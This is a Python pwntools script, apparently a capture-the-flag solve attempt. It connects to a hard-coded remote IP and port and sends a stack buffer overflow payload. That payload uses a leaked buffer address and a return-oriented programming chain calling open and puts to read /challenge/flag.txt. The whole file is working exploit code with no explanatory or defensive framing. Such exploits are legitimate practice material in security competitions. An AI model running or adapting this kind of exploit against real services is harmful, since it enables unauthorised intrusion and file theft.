#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

r = remote('154.57.164.77', 32702)
r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
r.recvuntil(b'[0x')
buf_leak = int(r.recvuntil(b']')[:-1], 16)
print(f'buf_leak: {hex(buf_leak)}')
r.recvuntil(b'wish for next year: ')

pop_rdi = 0x4011f2
pop_rsi_r15 = 0x401519
ret_gadget = 0x401016

path = b'/challenge/flag.txt\x00'
pad = b'A' * 64 + b'B' * 8

# Try: open + ret + pop_rdi + str + puts + main
rop = p64(pop_rdi)
rop += b'P' * 8
rop += p64(pop_rsi_r15)
rop += p64(0)
rop += p64(0)
rop += p64(0x4010e0)     # open@plt
rop += p64(ret_gadget)   # extra ret for alignment
rop += p64(pop_rdi)
rop += p64(0x402041)
rop += p64(0x401040)     # puts@plt
rop += p64(0x401393)     # main

path_offset = len(pad) + len(rop)
path_addr = buf_leak + path_offset
rop = rop[:8] + p64(path_addr) + rop[16:]

payload = pad + rop + path
print(f'Payload: {len(payload)}B, path at {hex(path_addr)}')
r.send(payload)

try:
    data = r.recv(timeout=5)
    print(f'Data ({len(data)}B): {data[:400]}')
    if data.count(b'Spooktober') >= 2:
        print('SUCCESS: open+ret+puts works!')
except Exception as e:
    print(f'Error: {e}')
r.close()
